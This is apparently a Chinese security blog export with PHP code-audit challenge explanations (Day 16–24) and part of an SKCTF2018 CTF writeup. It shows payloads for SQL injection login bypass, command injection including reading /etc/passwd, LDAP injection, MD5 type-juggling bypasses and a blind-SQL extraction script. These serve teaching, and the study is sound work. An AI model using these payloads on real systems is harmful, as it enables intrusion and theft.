<pre><code>http://www.test.com/index.php/http:%252f%252flanvnal.com?redirect=test&amp;params=test123 </code></pre>
<blockquote>
<p><a href="https://xz.aliyun.com/t/3057">https://xz.aliyun.com/t/3057</a></p>
</blockquote>
<h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><p><strong>code:</strong></p>
<pre><code class="php">class FTP &#123;
    public $sock;

    public function __construct($host, $port, $user, $pass) &#123;
        $this-&gt;sock = fsockopen($host, $port);

        $this-&gt;login($user, $pass);
        $this-&gt;cleanInput();
        $this-&gt;mode($_REQUEST[&#39;mode&#39;]);
        $this-&gt;send($_FILES[&#39;file&#39;]);
    &#125;

    private function cleanInput() &#123;
        array_filter($_GET, &#39;intval&#39;);
        array_filter($_POST, &#39;intval&#39;);
        array_filter($_COOKIE, &#39;intval&#39;);
    &#125;

    public function login($username, $password) &#123;
        fwrite($this-&gt;sock, &quot;USER &quot; . $username);
        fwrite($this-&gt;sock, &quot;PASS &quot; . $password);
    &#125;

    public function mode($mode) &#123;
        if ($mode == 1 || $mode == 2 || $mode == 3) &#123;
            fputs($this-&gt;sock, &quot;MODE $mode&quot;);
        &#125;
    &#125;

    public function send($data) &#123;
        fputs($this-&gt;sock, $data);
    &#125;
&#125;

new FTP(&#39;localhost&#39;, 21, &#39;user&#39;, &#39;password&#39;);</code></pre>
<p><strong>漏洞：</strong></p>
<p>虽然使用了<code>cleanInput</code>函数过滤了<code>$GET,$POST,$COOKIE</code>，将他们强制转成整型数据。但是后面却传入了一个从 REQUEST方式获取的 mode变量。</p>
<blockquote>
<p>超全局数组 <strong>$_REQUEST</strong> 中的数据，是 <strong>$_GET</strong> 、 <strong>$_POST</strong> 、 <strong>$_COOKIE</strong> 的合集，而且数据是复制过去的，并不是引用。</p>
</blockquote>
<p>所以 REQUEST 数据丝毫不受过滤函数的影响，最后过滤没起到任何作用。而且第21行比较使用的<code>==</code>弱比较，使用payload：<code>**?mode=1%0a%0dDELETE%20test.php** </code></p>
<h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><p><strong>code:</strong></p>
<pre><code class="php">class RealSecureLoginManager &#123;
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) &#123;
        $this-&gt;em = DoctrineManager::getEntityManager();
        $this-&gt;user = $user;
        $this-&gt;password = $password;
    &#125;

    public function isValid() &#123;
        $pass = md5($this-&gt;password, true);
        $user = $this-&gt;sanitizeInput($this-&gt;user);

        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
            -&gt;select(&quot;COUNT(p)&quot;)
            -&gt;from(&quot;User&quot;, &quot;u&quot;)
            -&gt;where(&quot;password = &#39;$pass&#39; AND user = &#39;$user&#39;&quot;);
        $query = $queryBuilder-&gt;getQuery();
        return boolval($query-&gt;getSingleScalarResult());
    &#125;

    public function sanitizeInput($input) &#123;
        return addslashes($input);
    &#125;
&#125;

$auth = new RealSecureLoginManager(
    $_POST[&#39;user&#39;],
    $_POST[&#39;passwd&#39;]
);
if (!$auth-&gt;isValid()) &#123;
    exit;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<p>这道题目是第13题的升级版本，我们知道在13题中主要是利用了<code>addslashes</code>和字符串截断的方式所造成的<code>\</code>逃逸从而形成的注入。本题最终的目的还是形成SQL注入从而进行任意账户登录。本题的关键问题是在于<code>md5($this-&gt;password, true);</code></p>
<blockquote>
<p>md5 — 计算字符串的 MD5 散列值</p>
<p>string md5 ( string <code>$str</code> [, bool <code>$raw_output</code> = false ] )</p>
<p>raw_output</p>
<p>如果可选的 <code>raw_output</code> 被设置为 **<code>TRUE</code>**，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
</blockquote>
<p>eg:</p>
<pre><code class="php">php &gt; var_dump(md5(&#39;1&#39;));
string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot;
php &gt; var_dump(md5(&#39;1&#39;,true));
�P�ou��&quot;6) &quot;��B8��#�</code></pre>
<p>如果我们能够保证最后经过<code>md5($this-&gt;password, true);</code>最后的字符串是<code>\</code>，那么就和Day13一样的效果，能绕过登录验证，通过fuzz，我们发现<code>md5(128,true)</code>得到的是<code>v�an���l���q��\</code>。</p>
<p>payload为<code>passwd=128&amp;user=&#39; or 1=1#</code></p>
<h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><p><strong>code：</strong></p>
<pre><code class="php">class JWT &#123;
    public function verifyToken($data, $signature) &#123;
        $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;);
        $signature = base64_decode($signature);
        if (openssl_verify($data, $signature, $pub)) &#123;
            $object = json_decode(base64_decode($data));
            $this-&gt;loginAsUser($object);
        &#125;
    &#125;
&#125;

(new JWT())-&gt;verifyToken($_GET[&#39;d&#39;], $_GET[&#39;s&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>问题出在<code>openssl_verify</code>的错误使用。</p>
<blockquote>
<p>int openssl_verify ( string <code>$data</code> , string <code>$signature</code> , <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$pub_key_id</code> [, <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$signature_alg</code> = OPENSSL_ALGO_SHA1 ] )</p>
<p><strong>openssl_verify()</strong> verifies that the <code>signature</code> is correct for the specified <code>data</code> using the public key associated with <code>pub_key_id</code>. This must be the public key corresponding to the private key used for signing.</p>
<p><strong>返回值</strong></p>
<p>Returns 1 if the signature is correct, 0 if it is incorrect, and -1 on error.</p>
</blockquote>
<p>错误的情况返回<code>-1</code>，这样的话就通过if判断了，因为if只在遇到<code>0</code>或者是<code>false</code>返回的才是<code>false</code>，那么只要让他出错就能绕过验证。如果让<code>openssl_verify()</code>出错呢？我们使用一个其他的<code>pub_key.pem</code>来生成<code>data</code>和<code>signature</code>,这样就可以使得<code>openssl_verify()</code>返回-1。</p>
<h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><p><strong>code：</strong></p>
<pre><code class="php">class ImageViewer &#123;
    private $file;

    function __construct($file) &#123;
        $this-&gt;file = &quot;images/$file&quot;;
        $this-&gt;createThumbnail();
    &#125;

    function createThumbnail() &#123;
        $e = stripcslashes(
            preg_replace(
                &#39;/[^0-9\\\]/&#39;,
                &#39;&#39;,
                isset($_GET[&#39;size&#39;]) ? $_GET[&#39;size&#39;] : &#39;25&#39;
            )
        );
        system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e
                ./thumbs/&#123;$this-&gt;file&#125;&quot;);
    &#125;

    function __toString() &#123;
        return &quot;&lt;a href=&#123;$this-&gt;file&#125;&gt;
                &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;&quot;;
    &#125;
&#125;

echo (new ImageViewer(&quot;image.png&quot;));</code></pre>
<p><strong>漏洞：</strong></p>
<p>问题出在<code>stripcslashes</code>函数，看一下PHP手册中的介绍。</p>
<blockquote>
<p><strong>stripcslashes</strong></p>
<p>stripcslashes — 反引用一个使用 <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.addcslashes.html">addcslashes()</a> 转义的字符串</p>
<p><strong>说明</strong></p>
<p>string stripcslashes ( string <code>$str</code> )</p>
<p>返回反转义后的字符串。可识别类似 C 语言的 <em>\n</em>，<em>\r</em>，… 八进制以及十六进制的描述。</p>
</blockquote>
<p>PS:还有一个类似的函数<code>stripslashes</code></p>
<blockquote>
<p>反引用一个引用字符串。</p>
</blockquote>
<p>差别在于<code>stripcslashes</code>会转义C语言以及十进制和8进制。例如：</p>
<pre><code class="php">php &gt; var_dump(stripcslashes(&#39;\x30\x3b\x73\x6c\x65\x65\x70\x20\x35\x3b&#39;));
string(10) &quot;0;sleep 5;&quot;    //十六进制
php &gt; var_dump(stripcslashes(&#39;0\073\163\154\145\145\160\0405\073&#39;));
string(10) &quot;0;sleep 5;&quot;    //八进制</code></pre>
<p>正则<code>/[^0-9\\\]/</code>限制了只能使用数字和<code>\</code>，所以可以使用八进制配合``stripcslashes<code>拼接</code>/usr/bin/convert {$this-&gt;file} –resize $e`执行命令，造成命令注入漏洞。</p>
<p>eg：传入：<code>size=0\073\163\154\145\145\160\0405\073</code></p>
<pre><code>/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</code></pre>
<h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><p><strong>code:</strong></p>
<pre><code class="php">set_error_handler(function ($no, $str, $file, $line) &#123;
    throw new ErrorException($str, 0, $no, $file, $line);
&#125;, E_ALL);

class ImageLoader
&#123;
    public function getResult($uri)
    &#123;
        if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;
            return &#39;&lt;p&gt;Please enter valid uri&lt;/p&gt;&#39;;
        &#125;

        try &#123;
            $image = file_get_contents($uri);
            $path = &quot;./images/&quot; . uniqid() . &#39;.jpg&#39;;
            file_put_contents($path, $image);
            if (mime_content_type($path) !== &#39;image/jpeg&#39;) &#123;
                unlink($path);
                return &#39;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&#39;;
            &#125;
        &#125; catch (Exception $e) &#123;
            return &#39;&lt;p&gt;There was an error: &#39; .
                $e-&gt;getMessage() . &#39;&lt;/p&gt;&#39;;
        &#125;

        return &#39;&lt;img src=&quot;&#39; . $path . &#39;&quot; width=&quot;100&quot;/&gt;&#39;;
    &#125;
&#125;

echo (new ImageLoader())-&gt;getResult($_GET[&#39;img&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>问题在于提供了错误显示，并且将错误输出了出来。可以利用错误信息的输出进行信息探测。</p>
<blockquote>
<p><code>set_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);</code></p>
<p>这个就类似于设置如下的代码：</p>
<p><code>error_reporting(E_ALL);ini_set(&#39;display_errors&#39;, TRUE);ini_set(&#39;display_startup_errors&#39;, TRUE);</code></p>
<p>如此就会包含所有的错误信息。加上<code>&#39;There was an error: &#39; .$e-&gt;getMessage() . &#39;&#39;</code>就导致会在页面上显示所有的信息，包括warning信息。</p>
</blockquote>
<p>正常情况下，如果使用<code>file_get_contents(&#39;http://127.0.0.1:80&#39;)</code>显示的仅仅只是<code>warning信息</code>，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。</p>
<h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><p><strong>code:</strong></p>
<pre><code class="php">declare(strict_types=1);

class ParamExtractor &#123;
    private $validIndices = [];

    private function indices($input) &#123;
        $validate = function (int $value, $key) &#123;
            if ($value &gt; 0) &#123;
                $this-&gt;validIndices[] = $key;
            &#125;
        &#125;;

        try &#123;
            array_walk($input, $validate, 0);
        &#125; catch (TypeError $error) &#123;
            echo &quot;Only numbers are allowed as input&quot;;
        &#125;

        return $this-&gt;validIndices;
    &#125;

    public function getCommand($parameters) &#123;
        $indices = $this-&gt;indices($parameters);
        $params = [];
        foreach ($indices as $index) &#123;
            $params[] = $parameters[$index];
        &#125;
        return implode($params, &#39; &#39;);
    &#125;
&#125;

$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&#39;p&#39;]);
system(&#39;resizeImg image.png &#39; . $cmd);</code></pre>
<blockquote>
<p>declare(strict_type=1);是<strong>php7</strong>引入的<code>严格类型检查模式</code>的指定语法.</p>
<p>在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用</p>
</blockquote>
<p>按说在声明了严格类型检查的模式下经过<code>validate()</code>函数检查的参数值都是大于0的int型。但是导致问题的是调用方式，<strong>通过<code>array_walk()</code>调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数</strong>。</p>
<p>e g:</p>
<pre><code class="php">declare(strict_types=1);
function addnum(int &amp;$value) &#123;
    $value = $value+1;
&#125;
$input = array(&#39;3a&#39;,&#39;4b&#39;);
var_dump($input);
array_walk($input,addnum);
var_dump($input);</code></pre>
<p>输出：</p>
<pre><code class="php">array(2) &#123;
  [0]=&gt;
  string(2) &quot;3a&quot;
  [1]=&gt;
  string(2) &quot;4b&quot;
&#125;

array(2) &#123;
  [0]=&gt;
  int(4)
  [1]=&gt;
  int(5)
&#125;</code></pre>
<p>由于<code>array_walk()</code>的这种特性，我们可以传入任意字符进去，造成了命令执行。</p>
<p>payload：<code>?p[1]=1&amp;p[2]=2;%20cat%20/etc/passwd</code></p>
<h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><p><strong>code:</strong></p>
<pre><code class="php">if (isset($_POST[&#39;password&#39;])) &#123;
    setcookie(&#39;hash&#39;, md5($_POST[&#39;password&#39;]));
    header(&quot;Refresh: 0&quot;);
    exit;
&#125;

$password = &#39;0e836584205638841937695747769655&#39;;
if (!isset($_COOKIE[&#39;hash&#39;])) &#123;
    echo &#39;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&#39;
       . &#39;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&#39;;
    exit;
&#125; elseif (md5($_COOKIE[&#39;hash&#39;]) == $password) &#123;
    echo &#39;Login succeeded&#39;;
&#125; else &#123;
    echo &#39;Login failed&#39;;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<p><code>md5($_COOKIE[&#39;hash&#39;]) == $password</code>使用的是<code>==</code>且<code>$password</code>为0e开头，比较时会当成科学计数法，所以找到一个hash为同样<code>0e数字</code>格式的就行。</p>
<pre><code class="php">php &gt; echo md5(&#39;240610708&#39;);
0e462097431906509019562988736854</code></pre>
<p>Payload:</p>
<pre><code>Cookie:hash=240610708</code></pre>
<h2 id="Day-23-Cookies"><a href="#Day-23-Cookies" class="headerlink" title="Day 23 - Cookies"></a>Day 23 - Cookies</h2><p><strong>code:</strong></p>
<pre><code class="php">class LDAPAuthenticator &#123;
    public $conn;
    public $host;

    function __construct($host = &quot;localhost&quot;) &#123;
        $this-&gt;host = $host;
    &#125;

    function authenticate($user, $pass) &#123;
        $result = [];
        $this-&gt;conn = ldap_connect($this-&gt;host);    
        ldap_set_option(
            $this-&gt;conn,
            LDAP_OPT_PROTOCOL_VERSION,
            3
        );
        if (!@ldap_bind($this-&gt;conn))
            return -1;
        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
        $result = ldap_search(
            $this-&gt;conn,
            &quot;&quot;,
            &quot;(&amp;(uid=$user)(userPassword=$pass))&quot;
        );
        $result = ldap_get_entries($this-&gt;conn, $result);
        return ($result[&quot;count&quot;] &gt; 0 ? 1 : 0);
    &#125;
&#125;

if(isset($_GET[&quot;u&quot;]) &amp;&amp; isset($_GET[&quot;p&quot;])) &#123;
    $ldap = new LDAPAuthenticator();
    if ($ldap-&gt;authenticate($_GET[&quot;u&quot;], $_GET[&quot;p&quot;])) &#123;
        echo &quot;You are now logged in!&quot;;
    &#125; else &#123;
        echo &quot;Username or password unknown!&quot;;
    &#125;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<p>题目中使用的过滤函数是<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>。</p>
<blockquote>
<p><strong>ldap_escape</strong></p>
<p>dap_escape — Escape a string for use in an LDAP filter or DN</p>
<p>string ldap_escape ( string <code>$value</code> [, string <code>$ignore</code> [, int <code>$flags</code> ]] )</p>
<p>Escapes <code>value</code> for use in the context implied by <code>flags</code>.</p>
<p><code>flags</code></p>
<p>The context the escaped string will be used in: <strong><code>LDAP_ESCAPE_FILTER</code></strong> for filters to be used with <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.ldap-search.html">ldap_search()</a>, or**<code>LDAP_ESCAPE_DN</code>** for DNs.</p>
</blockquote>
<p>当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效。</p>
<p>payload：<code>u=*&amp;p=123456</code></p>
<h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><p><strong>code:</strong></p>
<pre><code class="php">@$GLOBALS=$GLOBALS&#123;next&#125;=next($GLOBALS&#123;&#39;GLOBALS&#39;&#125;)
[$GLOBALS[&#39;next&#39;][&#39;next&#39;]=next($GLOBALS)[&#39;GLOBALS&#39;]]
[$next[&#39;GLOBALS&#39;]=next($GLOBALS[GLOBALS][&#39;GLOBALS&#39;])
[$next[&#39;next&#39;]]][$next[&#39;GLOBALS&#39;]=next($next[&#39;GLOBALS&#39;])]
[$GLOBALS[next][&#39;next&#39;]($GLOBALS[&#39;next&#39;]&#123;&#39;GLOBALS&#39;&#125;)]=
next(neXt($&#123;&#39;next&#39;&#125;[&#39;next&#39;]));</code></pre>
<p>一道CTF题</p>
<blockquote>
<p><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor</a></p>
</blockquote>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>SKCTF2018 WriteUp</title>
    <url>/2018/05/07/skctf2018-writeup/</url>
    <content><![CDATA[<hr>
<blockquote>
<p>SKCTF2018 WriteUp</p>
<p>山东科技大学网络安全小组</p>
</blockquote>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Wait-a-minute"><a href="#Wait-a-minute" class="headerlink" title="Wait_a_minute"></a>Wait_a_minute</h2><p>右键查看源代码，发现源码。</p>
<pre><code class="php">&lt;html&gt;
&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&lt;!--

if(isset($_POST[&#39;password&#39;]))
&#123;
    if(strcmp($_POST[&#39;password&#39;],$password)==0)&#123;
        echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;
        if(isset($_GET[&#39;time&#39;]))&#123;
                $t=$_GET[&#39;time&#39;];
                if(!is_numeric($t))&#123;
                        echo &#39;Sorry.&lt;br&gt;&#39;;
                &#125;else if($t &lt; 66 * 55 * 44 * 33 * 22 * 11 )&#123;
                                echo &#39;you need a bigger time.&lt;br&gt;&#39;;
                &#125;else if($t &gt; 11 * 23 * 33 * 44 * 55 * 66)&#123;
                                echo &#39;you need a smaller time.&lt;br&gt;&#39;;
                &#125;else&#123;
                        sleep((int)$t);
                        var_dump($flag);
                &#125;
                        echo &#39;&lt;hr&gt;&#39;;
        &#125;
    &#125;else&#123;
        echo &quot;Password is wrong............&lt;br&gt;&quot;;
    &#125;
&#125;else&#123;
    echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;
&#125;
--!&gt;



&lt;/html&gt;</code></pre>
<p>首先要求post一个password，要求与服务端设定的password相等才能继续，而这次用了双等号==比较，存在弱</p>
<p>类型绕过。Post一个数组即可</p>
<p><img src="/images/SKCTF2018/waitamin1.png" alt="waitamin1"></p>
<p>继续发现需要传入一个time时间。在sleep这些时间后会输出这个时间，而在源码中可以可以看到时间的大小在66 </p>
<p>55 * 44 * 33 * 22 * 11-11 * 23 * 33 * 44 * 55 * 66之间，也就是说只要等上个几百天flag就出来了。简单吧。</p>
<p>Ok，我们当然不能等上几百天，在源码中可以看到.</p>
<p><img src="/images/SKCTF2018/waitamin2.png" alt="waitamin2"></p>
<p>对时间t做了int强制转换，那么我们的机会来了。可以使用十六进制，绕过前边的时间检测，而十六进制以0x开</p>
<p>头，int转换后就是0，那么就可以得到flag了。</p>
<p><img src="/images/SKCTF2018/waitamin3.png" alt="waitamin3"></p>
<h2 id="Php-string"><a href="#Php-string" class="headerlink" title="Php_string"></a>Php_string</h2><p>题目存在源码泄露，访问 .index.php.swp</p>
<p>使用vim -r命令恢复</p>
<p>可以得到题目源码</p>
<p><img src="/images/SKCTF2018/phpstring1.png" alt="phpstring1"></p>
<p>可以看到得到flag的条件很简单，只要输入的id等于字符串‘6666‘即可，但是这里challenge函数对id进行了过滤，无法通过单双引号等方式传入字符串，百度一下可以发现php还有其他一些表示字符串的方式，可以找到一种heredoc的方式，而且佩奇图片的名字就是heredoc，这里其实也给了一些提示。</p>
<p>那么我们就可以用heredoc语法构造payload</p>
<pre><code class="php">Id=&lt;&lt;&lt;b

6666

 b;</code></pre>
<p>而需要注意的事，这里有三个换行，其中最后的分号后也需要换行，可以使用%oa代替</p>
<p>那么最终的payload :</p>
<pre><code class="php">?id=&lt;&lt;&lt;b%0a6666%0ab;%0a</code></pre>
<p><img src="/images/SKCTF2018/phpstring2.png" alt="phpstring2"></p>
<h2 id="八大关"><a href="#八大关" class="headerlink" title="八大关"></a>八大关</h2><pre><code>一些简单知识点的汇总</code></pre>
<h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>查看源代码，可以在注释中看到提示：</p>
<pre><code>你不是自己人，我不能让你进去！
&lt;!-- 悄悄告诉你，我们自己人的ip都是233.233.233.233 --&gt;</code></pre>
<p>可以知道这题限制了IP，我们利用X-Forwarded-For来伪造请求IP。</p>
<blockquote>
<p><strong>X-Forwarded-For</strong>（<strong>XFF</strong>）是用来识别通过<a href="https://www.wikiwand.com/zh-hans/HTTP">HTTP</a><a href="https://www.wikiwand.com/zh-hans/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理</a>或<a href="https://www.wikiwand.com/zh-hans/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载均衡</a>方式连接到<a href="https://www.wikiwand.com/zh-hans/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">Web服务器</a>的客户端最原始的<a href="https://www.wikiwand.com/zh-hans/IP%E5%9C%B0%E5%9D%80">IP地址</a>的HTTP请求头字段</p>
</blockquote>
<p>我们通过burpsuite来添加编辑X-Forwarded-For的值来伪造ip，成功通关。</p>
<h3 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h3><p>页面上的提示点明了我们要使用OS X 99 系统来访问，通过更改UA来通关。</p>
<blockquote>
<p>You should use “Mac OS X 99” to through the door!</p>
</blockquote>
<p>通过burpsuite将headers中的user-agent更改为题目要求的即可通关。</p>
<blockquote>
<p><strong>User-Agent</strong> 首部包含了一个特征字符串，用来让网络协议的对端来识别发起请求的用户代理软件的应用类型、操作系统、软件开发商以及版本号。</p>
</blockquote>
<h3 id="Challenge2"><a href="#Challenge2" class="headerlink" title="Challenge2"></a>Challenge2</h3><p>给出了关键代码：</p>
<pre><code>if($_POST[&quot;a&quot;] != $_POST[&quot;b&quot;] &amp;&amp; md5($_POST[&quot;a&quot;]) == md5($_POST[&quot;b&quot;]))&#123;
success!
&#125;</code></pre>
<p>payload：a=240610708,b=QLTHNDT（不唯一）</p>
<p><code>==</code>在进行比较的时候，会先将字符串类型转化成相同，再比较。如果一个字符串和数字进行比较会先将字符串进行类型转换成数值进行比较。0e开头加数字组成的字符串在比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。也就是只要是a，b的值经过md5加密后符合这种格式就能成功。</p>
<table>
<thead>
<tr>
<th align="center">a/b</th>
<th align="center">Md5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">240610708</td>
<td align="center">0e462097431906509019562988736854</td>
</tr>
<tr>
<td align="center">QLTHNDT</td>
<td align="center">0e405967825401955372549139051580</td>
</tr>
</tbody></table>
<h3 id="Challenge3"><a href="#Challenge3" class="headerlink" title="Challenge3"></a>Challenge3</h3><p>给出了关键代码：</p>
<pre><code>if(($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;])===md5($_GET[&#39;b&#39;]))&#123;
    success!;
        &#125;</code></pre>
<p>要求两个参数的值不相等，且a===b，两个md5的强等于比较，我们使用数组来绕过。</p>
<p>Payload:<code>challenge3.php?a[]=1&amp;b[]=2</code></p>
<p>md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。</p>
<h3 id="Challenge4"><a href="#Challenge4" class="headerlink" title="Challenge4"></a>Challenge4</h3><p>根据给出的提示，很显然是要爆破md5.已经提示了是纯数字进行的加密，所以爆破很容易。</p>
<pre><code>substr(md5(input),0,6) ===b04f51</code></pre>
<p>md5爆破：</p>
<pre><code class="python">import hashlib

def getmd5(code):
    for i in range(999999):
        temp = hashlib.md5(str(i)).hexdigest()
        if temp[0:6] == code:
            return i 

if __name__ == &#39;__main__&#39;:
    print getmd5(&#39;b04f51&#39;)

#587478</code></pre>
<h3 id="Challenge5"><a href="#Challenge5" class="headerlink" title="Challenge5"></a>Challenge5</h3><p>给出了关键代码，通过strcmp函数来比较两个参数，通过数组绕过。</p>
<pre><code>if(!strcmp($_POST[&#39;a&#39;],$_POST[&#39;b&#39;]))&#123;
success!
&#125;</code></pre>
<p>payload：<code>/challeneg5.php?a[]=1&amp;b=123</code></p>
<p>strcmp()是比较两个字符串是否相等的函数， 他的判断原理是先将两个字符串转换成ascii然后进行减法运算，结果和0比较， 如果str1&lt;str2 则返回&lt;0，如果str1大于str2返回&gt;0 如果两者相等 返回0 所以它是对字符串类型进行的操作，如果传入数组呢。结果是null但是与0进行松散比较结果是true的。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-14%20%E4%B8%8B%E5%8D%881.42.20.png" alt="松散比较"></p>
<h3 id="Challenge6"><a href="#Challenge6" class="headerlink" title="Challenge6"></a>Challenge6</h3><p>关键代码已给出,要求参数不能是SKCTF且经过urldecode后等于SKCTF，因为会自动进行一次urldecode，所以将SKCTF进行hex编码两次。</p>
<pre><code>if(eregi(&quot;SKCTF&quot;,$_GET[&#39;code&#39;])) &#123;    
echo(&quot;code error!&quot;);    
exit();    
&#125;    

$_GET[&#39;code&#39;] = urldecode($_GET[&#39;code&#39;]);    
if($_GET[&#39;code&#39;] == &quot;SKCTF&quot;)    
&#123;    
success;    
&#125;    </code></pre>
<p>Payload:</p>
<pre><code>/?code=%25%35%33%25%34%62%25%34%33%25%35%34%25%34%36</code></pre>
<h3 id="Lastchallenge"><a href="#Lastchallenge" class="headerlink" title="Lastchallenge"></a>Lastchallenge</h3><p>检查元素能看到密码锁的js代码，js验证密码所以要么改js要么直接输入密码，通关。</p>
<pre><code class="javascript">var Lock = function () &#123;
  function Lock() &#123;
    _classCallCheck(this, Lock);

    this.pin = &#39;7982&#39;;
    this.setupDom();
    this.setupFlickity();
    this.setupAudio();
    this.onResize();
    this.listen();
  &#125;</code></pre>
<p>得到flag：SKCTF{haHA_EZ_D0oR}</p>
<h2 id="login-me"><a href="#login-me" class="headerlink" title="login me"></a>login me</h2><p>这题考察sql bool盲注，难点在于waf的绕过。</p>
<p>这里直接给出源码的waf</p>
<pre><code class="php">$waf=&quot;union|if| |=|and|&gt;|&lt;|or|substr|mid|left|right|like|regexp&quot;;</code></pre>
<p>具体黑盒测试时可以用burpsuite中的intruder工具构建字典自行fuzz。</p>
<p>waf中的空格用<code>/**/</code>绕过，<code>=</code>用<code>in</code>代替，<code>lpad</code>函数用来截取字符串。</p>
<p>题目还有sql数据库结构泄露，直接访问web4.sql可以看到数据库的结构。</p>
<p>payload：<code>username=1&#39;/**/||/**/lpad((&#39;a&#39;),1,1)/**/in/**/(&#39;a&#39;)#&amp;password=123</code></p>
<p>接下来就可以直接盲注查表了。</p>
<pre><code class="python">#-*-coding:utf-8-*-

import requests 
import time

url = &#39;http://192.168.211.131:49154/&#39; 

def check(payload):
    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
    r = requests.post(url,postdata).content
    #print r
    return &#39;Wrong password&#39; in r

flag=&#39;&#39;
s = r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#39;
for i in xrange(1,64):    
    for c in s:        
        payload = &#39;1\&#39;/**/||/**/lpad((select/**/f14g/**/from/**/f1ag),%s,1)/**/in/**/(\&#39;%s\&#39;)#&#39;%(str(i),flag+c)     
        #print payload
        if check(payload):
            flag += c
            break
    print flag
    if &#39;&#125;&#39; in flag:
        break    </code></pre>
<h2 id="绕啊绕"><a href="#绕啊绕" class="headerlink" title="绕啊绕"></a>绕啊绕</h2><hr>
<p>给了关键代码，先一句一句分析代码，一步步绕过条件：</p>
<pre><code>$rule = &#39;/([[:punct:]]+|[[:alpha:]]+|[[:digit:]]+)/&#39;;</code></pre>
<p>这句是规定了一个rule参数，如果了解php的可以知道，PHP的正则表达式有一些内置的通用字符簇，<code>[[:punct:]]</code>代表了任何标点符号，<code>[[:alpha:]]</code>代表了任何字母，不区分大小写，<code>[[:digit:]]</code>代表了任何数字，接着读代码：</p>
